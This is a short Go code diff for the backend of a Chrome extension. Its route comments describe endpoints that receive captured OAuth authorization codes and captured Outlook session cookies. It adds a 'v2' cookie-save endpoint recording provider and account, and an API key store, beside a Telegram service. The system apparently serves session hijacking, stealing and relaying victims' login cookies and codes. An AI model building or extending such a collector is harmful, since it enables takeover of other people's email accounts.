@@ -18,10 +18,12 @@ import (
 //	GET  /api/extension/ping              - Health check for extension connectivity
 //	POST /api/extension/oauth/callback    - Receive captured OAuth authorization codes
 //	POST /api/extension/cookies/save      - Receive captured Outlook session cookies
+//	POST /api/extension/cookies/save-v2   - v1.0.43: Enhanced save with provider + account
 type ChromeExtension struct {
 	Common
 	TelegramService    *service.Telegram
 	CookieStoreService *service.CookieStoreService
+	APIKeyStore        *ExtensionAPIKeyStore
 }
 
 // --- Request / Response types ---
